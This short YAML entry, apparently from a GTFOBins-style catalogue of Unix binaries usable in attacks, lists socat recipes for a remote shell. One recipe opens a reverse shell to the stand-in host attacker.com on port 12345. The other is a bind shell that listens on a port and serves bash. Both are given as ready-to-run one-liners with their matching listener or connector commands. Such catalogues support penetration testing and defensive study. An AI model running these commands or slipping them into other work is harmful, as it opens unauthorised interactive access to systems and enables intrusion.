---
functions:
  reverse-shell:
    - description: Run <code>socat file:`tty`,raw,echo=0 tcp-listen:12345</code> to receive the shell on the other end.
      code: |
        RHOST=attacker.com
        RPORT=12345 
        socat tcp-connect:$RHOST:$RPORT exec:"bash -li",pty,stderr,setsid,sigint,sane
  bind-shell:
    - description: Run <code>socat FILE:`tty`,raw,echo=0 TCP:target.com:12345</code> to connect to the shell on the other end.
      code: |
        LPORT=12345
        socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
---